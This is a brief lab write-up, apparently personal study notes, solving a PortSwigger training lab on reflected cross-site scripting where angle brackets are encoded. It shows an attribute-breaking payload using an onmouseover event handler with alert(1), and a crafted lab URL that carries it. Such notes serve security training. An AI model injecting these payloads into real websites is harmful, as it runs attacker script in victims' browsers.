**Reflected XSS into attribute with angle brackets HTML-encoded**
Our payload
```
viet" onmouseover="alert(1)
``` 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f92098d7-dbca-45f2-9b1d-ca157feb7189)







When you move the mouse over the injected element it should trigger an alert

From <https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded> 


If a victim has this link we have xss attack executed
https://0a2500df03c678048011dfa300d500eb.web-security-academy.net/?search=viet%22+onmouseover%3D%22alert%281%29+
